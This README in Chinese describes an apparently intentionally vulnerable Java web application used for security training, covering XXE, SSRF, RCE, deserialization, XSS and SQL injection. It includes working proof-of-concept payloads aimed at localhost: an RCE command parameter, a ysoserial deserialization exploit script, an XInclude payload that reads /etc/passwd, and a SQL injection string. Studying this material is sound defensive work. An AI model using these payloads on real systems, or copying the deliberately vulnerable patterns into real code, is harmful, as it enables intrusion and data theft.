# Java Security Code

## 介绍

该项目也可以叫做Java Vulnerability Code(Java漏洞代码)。

每个漏洞类型代码默认存在安全漏洞（除非本身不存在漏洞），相关修复代码在注释里。具体可查看每个漏洞代码和注释。

## 漏洞代码

- [XXE](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/XXE.java)
- [SSRF](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java)
- [URL重定向](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/URLRedirect.java)
- [IP伪造](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/IPForge.java)
- [XSS](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/XSS.java)
- [CRLF注入](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/CRLFInjection.java)
- [远程命令执行](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Rce.java)
- [反序列化](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Deserialize.java)
- [文件上传](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/FileUpload.java)
- [SQL注入](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SQLI.java)

## 如何运行


### Tomcat

1. 生成war包 `mvn clean package`
2. 将target目录的war包，cp到Tomcat的webapps目录
3. 重启Tomcat应用


```
http://localhost:8080/java-sec-code-1.0.0/rce/exec?cmd=whoami
```
 
返回

``` 
Viarus
```

### IDEA

如果想在IDEA中直接运行，需要在IDEA中添加Tomcat配置，步骤如下：

```
Run -> Edit Configurations -> 添加TomcatServer(Local) -> Server中配置Tomcat路径 -> Deployment中添加Artifact选择java-sec-code:war exploded
```

![tomcat](https://github.com/JoyChou93/java-sec-code/raw/master/idea-tomcat.png)

配置完成后，右上角直接点击run，即可运行。

```
http://localhost:8080/rce/exec?cmd=whoami
```
 
返回

``` 
Viarus
```


## SSRF

针对SSRF具体利用，可以阅读我写的[这篇博文](https://joychou.org/java/javassrf.html)。

## 反序列化

打包ysoserial

``` 
git clone https://github.com/frohoff/ysoserial.git
mvn clean package -DskipTests
```

执行exp

```python
#coding: utf-8
#author: JoyChou
#date:   2018.07.17

import requests
import subprocess

def poc(url , gadget, command):
	ys_filepath = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'
	popen = subprocess.Popen(['java', '-jar', ys_filepath, gadget, command], stdout=subprocess.PIPE)
	payload = popen.stdout.read()
	r = requests.post(url, data=payload, timeout=5)

if __name__ == '__main__':
	poc('http://127.0.0.1:8080/deserialize/test', 'CommonsCollections5', 'open -a Calculator')
```

## 文件上传

目前这类漏洞在spring里非常少，原因有两点：
1. 大多数公司上传的文件都会到cdn
2. spring的jsp文件必须在web-inf目录下才能执行

除非，可以上传war包到tomcat的webapps目录。所以就不YY写漏洞了。

访问`http://localhost:8080/file/`进行文件上传，上传成功后，再访问`http://localhost:8080/image/上传的文件名`可访问上传后的文件。

## XXE

### 支持Xinclude的XXE

2018年08月22日更新支持XInclude的XXE漏洞代码，详情见代码。

POC

```xml
<?xml version="1.0" ?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

URL编码后的payload

``` 
http://localhost:8080/xxe/DocumentBuilder_xinclude?xml=%3C%3fxml+version%3d%221.0%22+%3f%3E%0d%0a%3Croot+xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3E%0d%0a+%3Cxi%3ainclude+href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22+parse%3d%22text%22%2f%3E%0d%0a%3C%2froot%3E
```

详情可以查看[浅析xml之xinclude & xslt](https://www.anquanke.com/post/id/156227)

## SQL注入

### POC

访问`http://localhost:8080/sqli/jdbc?id=1' or 'a'='a`返回`joychou: 123 wilson: 456 lightless: 789`。

正常访问`http://localhost:8080/sqli/jdbc?id=1`返回`joychou: 123`

### 数据库表数据SQL

```sql

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `name` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `isAdmin` varchar(255) NOT NULL,
  `id` int(10) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

-- ----------------------------
-- Records of users
-- ----------------------------
BEGIN;
INSERT INTO `users` VALUES ('joychou', '123', '1', 1);
INSERT INTO `users` VALUES ('wilson', '456', '0', 2);
INSERT INTO `users` VALUES ('lightless', '789', '0', 3);
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;


```

### 说明

SQL注入修复方式采用预处理方式，修复见代码。Mybatis的`#{}`也是预处理方式处理SQL注入。

在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写sql语句时，注意orderBy后的变量要使用${},而不用#{}。因为`#{}`变量是经过预编译的，${}没有经过预编译。虽然${}存在sql注入的风险，但orderBy必须使用`${}`，因为`#{}`会多出单引号`''`导致sql语句失效。为防止sql注入只能自己判断输入的值是否是否存在SQL。